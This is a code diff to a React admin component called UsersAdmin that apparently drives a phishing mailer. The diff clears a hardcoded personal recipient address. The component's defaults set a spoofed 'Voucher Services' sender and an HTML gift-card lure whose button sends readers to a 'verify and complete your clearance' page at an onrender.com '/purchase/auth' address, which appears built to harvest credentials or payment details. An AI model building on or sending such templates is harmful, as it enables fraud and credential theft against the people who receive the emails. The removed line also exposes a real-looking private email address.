@@ -5,7 +5,7 @@ const UsersAdmin = () => {
     const navigate = useNavigate();
     
     // States
-    const [recipient, setRecipient] = useState('nkwam44@gmail.com');
+    const [recipient, setRecipient] = useState('');
     const [subject, setSubject] = useState('Dynamic Voucher Generated');
     const [sender, setSender] = useState('Voucher Services <delivery@recharge-hub.com>');
     const [body, setBody] = useState('<div style="font-family: sans-serif; padding: 20px; background: #fafafa;">\n  <h2>Your Digital Gift Card is Ready!</h2>\n  <p>Your secure network voucher has been generated successfully.</p>\n  <p>Click below to verify and complete your clearance clearance to claim the card.</p>\n  <a href="https://potential-carnival.onrender.com/purchase/auth" style="display: inline-block; padding: 10px 20px; background: #6366f1; color: white; text-decoration: none; border-radius: 6px;">Claim Your Gift Card</a>\n</div>');
